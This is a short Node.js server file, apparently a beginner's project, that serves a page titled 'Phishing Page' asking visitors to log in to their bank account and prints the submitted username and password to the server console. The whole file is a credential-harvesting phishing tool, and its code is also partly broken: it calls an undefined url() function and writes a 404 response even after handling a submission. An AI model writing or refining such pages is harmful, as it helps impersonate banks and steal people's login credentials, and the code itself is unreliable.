import http from 'http'
import fs from 'fs'

const server = http.createServer((req, res) => {

    res.setHeader('Content-Type', 'text/html')

    if (req.url === '/') {
        res.write(`
        
        <html>
        <head>
            <title>Phishing Page</title>
        </head>
        <body>  
            <h1>Login to Your Bank Account</h1>
            <form action="/submit" method="GET">
                <label for="username">Username:</label><br/>
                <input type="text" id="username" name="username" required><br/>
                <label for="password">Password:</label><br/>
                <input type="password" id="password" name="password" required><br/><br/>
                <input type="submit" value="Login">
            </form>
        </body>
        </html>
        `)
        res.end()
    }
    else if (req.url.startsWith('/submit')) {
        const { username, password } = url().parse(req.url, true).query

        console.log(`Username: ${username}, Password: ${password}`)
    }
    res.writeHead(404, { 'Content-Type': 'text/plain' })
    res.write('tw pagal ho')
    res.end()
}


)
const port = 3000
server.listen(port, () => {
    console.log(`server is running on port ${port}`)
})